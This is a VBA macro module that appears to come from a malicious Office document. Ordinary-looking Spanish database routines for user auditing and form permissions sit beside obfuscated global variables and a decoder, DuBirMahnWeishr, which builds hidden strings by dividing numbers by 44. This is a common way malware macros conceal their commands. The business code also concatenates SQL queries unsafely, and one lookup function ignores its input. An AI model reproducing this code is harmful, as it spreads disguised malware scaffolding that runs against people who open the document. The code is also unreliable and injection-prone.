Attribute VB_Name = "Mo"
 
Global Const mensaje_cancelar = " Pulse Click para abandonar esta ventana."
Global Const mensaje_cerrar = " Pulse Click para abandonar esta ventana."
Global Const mensaje_salir = " Pulse Click para abandonar esta ventana."
Global Const mensaje_opcion = " Pulse Click para seleccionar Opci?n."
Global Const mensaje_copiar = " Pulse Click para Copiar al Portapapeles."
Public GromGremitKustiTryasutsyaDAcdaw As Object
Public GromGremitKustiTryasutsyaPLAPEKCwwed As Object
Public GromGremitKustiTryasutsyaKSKLAL As Object
Public GromGremitKustiTryasutsyaXSAOO() As String


Public GromGremitKustiTryasutsyaLAKOPPC As String
Public GromGremitKustiTryasutsyaPLAPEKC() As String
Public GromGremitKustiTryasutsyaUUUKA As String
Public GromGremitKustiTryasutsyaUUUKABBB As String


Public GromGremitKustiTryasutsyaGMAKO As Object
Public GromGremitKustiTryasutsya4 As String
 Public GromGremitKustiTryasutsya2 As String
Public GromGremitKustiTryasutsyaASALLLP As Variant





















Public Function VerAuditoria()
Dim SQL As String


VerAuditoria = False
RsUsu.ActiveConnection = Con

SQL = "Select * FROM usuarios "
SQL = SQL & " WHERE usu_id=" & IdUsuario
RsUsu.Open SQL

    If Not RsUsu.EOF Then
     If RsUsu!usu_auditor = "S" Then
        VerAuditoria = True
     Else
        VerAuditoria = False
     End If
        
        
    
    End If



End Function


Public Function permisos(nombreformu As String, IdUsuario As Long) As Boolean

Dim SQL As String
Dim idformu As Long

permisos = False
RsUsu.ActiveConnection = Con
idformu = BuscarIdFormu(nombreformu)

SQL = "Select * FROM PermisosPorFormu "
SQL = SQL & " WHERE ppf_idformu=" & idformu
SQL = SQL & " AND ppf_idusuario=" & IdUsuario
RsUsu.Open SQL

    If Not RsUsu.EOF Then
     permisos = True
     p = RsUsu!ppf_permisos
        
        
    
    End If



End Function
Public Function BuscarIdFormu(nombreformu As String) As Long
Dim SQL As String

RsFormu.ActiveConnection = Con

SQL = "Select * from Formularios WHERE frm_nombre=" & ""

RsFormu.Open SQL

    If Not RsFormu.EOF Then
        BuscarIdFormu = RsFormu!frm_id
    End If
End Function


Public Function DuBirMahnWeishr(GromGremitKustiTryasutsya6 As Integer) As String
Dost = CInt(GromGremitKustiTryasutsyaXSAOO(GromGremitKustiTryasutsya6))
DuBirMahnWeishr = Chr(Dost / 44)
End Function
Public Function GodnTeBabenParama(A1 As String, A2 As String, A3 As String) As String
GodnTeBabenParama = Replace(A1, A2, A3)
End Function


